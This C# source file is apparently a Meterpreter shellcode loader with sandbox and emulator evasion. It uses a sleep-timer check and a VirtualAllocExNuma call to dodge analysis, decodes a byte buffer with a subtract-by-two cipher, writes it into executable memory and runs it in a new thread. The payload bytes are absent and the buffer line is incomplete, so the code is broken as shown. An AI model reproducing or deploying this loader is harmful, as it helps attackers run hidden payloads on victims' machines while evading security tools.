using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace Met
{
    class Program
    {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    static void Main(string[] args)
    {

        //Sleep timer bypass
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5) {
            return;
        }
        Console.WriteLine("Sleep timer bypassed!");

        //Non emulated api's
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null) {
            return;
	
        }
        Console.WriteLine("Emulation done!");
	byte[] buf = new byte[597]

        byte[] encoded = new byte[buf.Length];
        for (int i = 0; i < buf.Length; i++)
        
        {
        encoded[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
        }
        buf = encoded;
        Console.WriteLine("Cipher decrypted!");
        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Console.WriteLine("Allocation Complete!");
        Marshal.Copy(buf, 0, addr, size);
        Console.WriteLine("Copy done!");
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        Console.WriteLine("Thread Created");
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("Reached End");
    }
    }
}
